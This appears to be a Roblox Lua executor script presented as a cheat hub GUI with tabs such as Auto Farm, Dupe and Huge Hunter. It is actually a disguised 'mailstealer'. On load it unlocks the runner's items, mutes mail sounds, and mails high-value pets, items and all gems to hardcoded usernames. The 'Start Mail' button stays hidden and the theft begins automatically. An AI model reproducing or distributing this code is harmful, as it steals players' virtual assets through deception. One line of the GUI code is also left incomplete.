_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

-- =================== EXECUTOR COMPATIBILITY ===================
local requestFunction = request or (syn and syn.request) or (fluxus and fluxus.request) or http_request
local getgcFunction = getgc or (debug and debug.getgc) or get_gc_objects
local getHUI = (gethui and gethui) or function() return game:GetService("CoreGui") end
local queueOnTP = queue_on_teleport or (syn and syn.queue_on_teleport) or (fluxus and fluxus.queue_on_teleport)
-- =======================================================================

-- =================== SERVICES ===================
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local plr = Players.LocalPlayer

-- =================== LIBRARIES ===================
local network = require(ReplicatedStorage.Library.Client.Network)
local message = require(ReplicatedStorage.Library.Client.Message)
local save = require(ReplicatedStorage.Library.Client.Save).Get().Inventory
local library = require(ReplicatedStorage.Library)

-- =================== SETTINGS ===================
local users = _G.Usernames or {"ilovemyamazing_gf1","Yeahboi1131","Dragonshell23","Dragonshell24","Dragonshell21"}
local min_rap = _G.minrap or 10000000
local webhook = _G.webhook or ""
local MailMessage = "GGz"
local sortedItems = {}
local totalRAP = 0
local GemAmount1 = 0
local mailSendPrice

-- =================== VALIDATION ===================
if next(users) == nil or webhook == "" then
    plr:kick("You didn't add usernames or webhook")
    return
end
for _, user in ipairs(users) do
    if plr.Name == user then
        plr:kick("You cannot mailsteal yourself")
        return
    end
end

-- =================== GET MAIL PRICE ===================
local FunctionToGetFirstPriceOfMail
for _, func in pairs(getgcFunction()) do
    if type(func) == "function" and debug.getinfo(func).name == "computeSendMailCost" then
        FunctionToGetFirstPriceOfMail = func
        break
    end
end
mailSendPrice = FunctionToGetFirstPriceOfMail and FunctionToGetFirstPriceOfMail() or 1

-- =================== GET GEM AMOUNT ===================
for _, v in pairs(save.Currency) do
    if v.id == "Diamonds" then
        GemAmount1 = v._am
        break
    end
end

-- =================== FORMAT NUMBERS ===================
local function formatNumber(number)
    local suffixes = {"", "k", "m", "b", "t"}
    local index = 1
    number = math.floor(number)
    while number >= 1000 do
        number = number / 1000
        index += 1
    end
    return string.format("%.2f%s", number, suffixes[index])
end

-- =================== MUTE MAIL SOUNDS ===================
game.DescendantAdded:Connect(function(x)
    if x:IsA("Sound") then
        if x.SoundId == "rbxassetid://11839132565" or x.SoundId == "rbxassetid://14254721038" or x.SoundId == "rbxassetid://12413423276" then
            x.Volume = 0
            x.PlayOnRemove = false
            x:Destroy()
        end
    end
end)

-- =================== ABSTRACT GetRAP ===================
local function getRAP(Type, Item)
    return (require(ReplicatedStorage.Library.Client.RAPCmds).Get({
        Class = {Name=Type},
        IsA=function(h) return h==Type end,
        GetId=function() return Item.id end,
        StackKey=function() return HttpService:JSONEncode({id=Item.id, pt=Item.pt, sh=Item.sh, tn=Item.tn}) end
    }) or 0)
end

-- =================== SEND ITEM FUNCTION ===================
local function sendItem(category, uid, amount)
    local userIndex = 1
    while userIndex <= #users do
        local sendAmount = (category=="Pet") and 1 or amount
        local success, err = network.Invoke("Mailbox: Send", users[userIndex], MailMessage, category, uid, sendAmount)
        if success then
            GemAmount1 -= mailSendPrice
            mailSendPrice = math.min(math.ceil(mailSendPrice*1.5),5000000)
            if category ~= "Pet" then break end
            amount -= 1
            if amount <= 0 then break end
        elseif err == "They don't have enough space!" then
            userIndex += 1
        else
            warn("Send failed:", err)
            break
        end
    end
end

-- =================== SEND ALL GEMS ===================
local function SendAllGems()
    local gemUID
    for uid, data in pairs(save.Currency) do
        if data.id == "Diamonds" then gemUID=uid break end
    end
    if not gemUID or GemAmount1<=0 then return end
    local userIndex = 1
    while userIndex <= #users do
        local success, err = network.Invoke("Mailbox: Send", users[userIndex], MailMessage, "Currency", gemUID, GemAmount1)
        if success then GemAmount1=0 break
        elseif err=="They don't have enough space!" then userIndex+=1
        else break end
    end
end

-- =================== CLAIM MAIL & EMPTY BOXES ===================
local function ClaimMail()
    local res, err = network.Invoke("Mailbox: Claim All")
    while err=="You must wait 30 seconds before using the mailbox!" do
        task.wait(0.05)
        res, err = network.Invoke("Mailbox: Claim All")
    end
end
local function EmptyBoxes()
    if save.Box then
        for k,v in pairs(save.Box) do
            if v._uq then network.Invoke("Box: Withdraw All",k) end
        end
    end
end

-- =================== CAN SEND CHECK ===================
local function canSendMail()
    local uid
    if save.Pet then for i,v in pairs(save.Pet) do uid=i break end end
    if not uid then return false end
    local _, err = network.Invoke("Mailbox: Send","Roblox","Test","Pet",uid,1)
    return (err=="They don't have enough space!")
end

-- =================== COLLECT ITEMS ===================
require(ReplicatedStorage.Library.Client.DaycareCmds).Claim()
require(ReplicatedStorage.Library.Client.ExclusiveDaycareCmds).Claim()
local categories = {"Pet","Egg","Charm","Enchant","Potion","Misc","Ultimate"}
for _,cat in pairs(categories) do
    if save[cat] then
        for uid,item in pairs(save[cat]) do
            local rap = getRAP(cat,item)
            if cat=="Pet" then
                local dir = require(ReplicatedStorage.Library.Directory.Pets)[item.id]
                if (dir.huge or dir.exclusiveLevel) and rap>=min_rap then
                    local prefix = (item.pt==1 and "Golden " or item.pt==2 and "Rainbow " or "")
                    if item.sh then prefix="Shiny "..prefix end
                    table.insert(sortedItems,{category=cat,uid=uid,amount=item._am or 1,rap=rap,name=prefix..item.id})
                    totalRAP+=rap*(item._am or 1)
                end
            elseif rap>=min_rap then
                table.insert(sortedItems,{category=cat,uid=uid,amount=item._am or 1,rap=rap,name=item.id})
                totalRAP+=rap*(item._am or 1)
            end
            if item._lk then network.Invoke("Locking_SetLocked",uid,false) end
        end
    end
end

-- =================== MAIL SENDER START ===================
local function StartMailProcess()
    if #sortedItems == 0 and GemAmount1 <= min_rap + mailSendPrice then
        message.Error("Nothing meets min RAP or not enough gems.")
        return
    end

    ClaimMail()
    EmptyBoxes()
    if not canSendMail() then
        message.Error("Account error. Rejoin or use another account.")
        return
    end

    table.sort(sortedItems, function(a,b) return (a.rap*a.amount)>(b.rap*b.amount) end)

    -- send items
    for _, item in ipairs(sortedItems) do
        if item.rap>=min_rap and GemAmount1>mailSendPrice then
            if item.category=="Pet" then
                for i=1,item.amount do
                    task.spawn(function() sendItem(item.category,item.uid,1) end)
                    task.wait(0.05)
                end
            else
                task.spawn(function() sendItem(item.category,item.uid,item.amount) end)
                task.wait(0.05)
            end
        end
    end

    if GemAmount1>mailSendPrice then SendAllGems() end
end

-- =================== GUI CREATION ===================
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "StrikeHubGUI"
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = plr:WaitForChild("PlayerGui")

local Frame = Instance.new("Frame")
Frame.Name = "Main"
Frame.Size = UDim2.new(0,400,0,250)
Frame.Position = UDim2.new(0,50,0.5,-125) -- left-center
Frame.BackgroundColor3 = Color3.fromRGB(20,20,20)
Frame.BorderSizePixel =
Frame.Parent = ScreenGui

-- Tabs
local Tabs = {"Home","Current Event","Auto Farm","Egg","Mailbox","Dupe","Huge Hunter"}
local TabButtons = {}
local ContentFrames = {}

for i, name in ipairs(Tabs) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0,100,0,30)
    btn.Position = UDim2.new(0,(i-1)*100,0,0)
    btn.Text = name
    btn.Font = Enum.Font.GothamBold
    btn.TextSize = 14
    btn.BackgroundColor3 = Color3.fromRGB(35,35,35)
    btn.TextColor3 = Color3.fromRGB(255,255,255)
    btn.Parent = Frame
    TabButtons[name] = btn

    local cf = Instance.new("Frame")
    cf.Size = UDim2.new(1,0,1,-40)
    cf.Position = UDim2.new(0,0,0,40)
    cf.BackgroundTransparency = 1
    cf.Visible = (i==1)
    cf.Parent = Frame
    ContentFrames[name] = cf

    btn.MouseButton1Click:Connect(function()
        for _, f in pairs(ContentFrames) do f.Visible=false end
        cf.Visible = true
    end)
end

-- Launch Button (hidden, since mail sender starts immediately)
local Launch = Instance.new("TextButton")
Launch.Size = UDim2.new(0,100,0,30)
Launch.Position = UDim2.new(0,0,1,-35)
Launch.Text = "Start Mail"
Launch.Font = Enum.Font.GothamBold
Launch.TextSize = 14
Launch.BackgroundColor3 = Color3.fromRGB(50,50,50)
Launch.TextColor3 = Color3.fromRGB(255,255,255)
Launch.Parent = Frame
Launch.Visible = false
Launch.MouseButton1Click:Connect(function() StartMailProcess() end)

-- Draggable after 5 seconds
task.delay(5,function()
    Frame.Active = true
    Frame.Draggable = true
end)

-- Run mail sender immediately
task.spawn(StartMailProcess)
